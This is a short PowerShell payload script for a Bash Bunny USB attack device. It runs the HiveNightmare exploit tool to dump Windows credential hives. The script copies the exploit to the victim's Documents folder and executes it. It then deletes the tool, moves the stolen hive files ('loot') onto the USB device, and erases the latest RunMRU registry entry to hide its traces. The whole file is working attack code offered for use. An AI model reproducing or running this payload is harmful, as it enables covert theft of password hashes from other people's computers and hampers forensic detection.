###############################
# HiveNightmare for Bash Bunny
# v 1.0
# Author: hitem
###############################

### VARIABLES
$mytemp = [environment]::getfolderpath(“mydocuments”)
# Edit Source to fit your Switch. Switch1-2 is used instead of Tools as the file has to be copied localy
$source = @((gwmi win32_volume -f 'label=''BashBunny''').Name+'\payloads\switch1\HiveNightmare.exe')
$destination = "$mytemp\hive"
$loot = @((gwmi win32_volume -f 'label=''BashBunny''').Name+'loot\')
$order66 = "$mytemp\hive\HiveNightmare.exe"

### EXECUTION
# Create workdirr in mydocuments
New-Item -ItemType Directory -Force -Path "$mytemp\hive"
Start-Sleep 1

# Copy that sweet thing to mydocuments
Copy-Item -Path $source -Destination $destination -recurse -force
Start-Sleep 1

# Start the hivenightmare.exe and then remove it after 6 seconds
# The start-sleep is requiered so the *.exe has time to run and collect the files
Start-Process -FilePath $order66 -WorkingDirectory $destination
Start-Sleep 6
Remove-Item $order66 -force -Confirm:$false

# Extract loot with move-item to clear trace in my documents
Move-Item -Path $destination -Destination $loot[0] -force

# Delete last entry in Run
$p = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU"; $m = "MRUList"; $l=(gp $p).$m; rp $p $l[0]; sp $p $m $l.Substring(1);
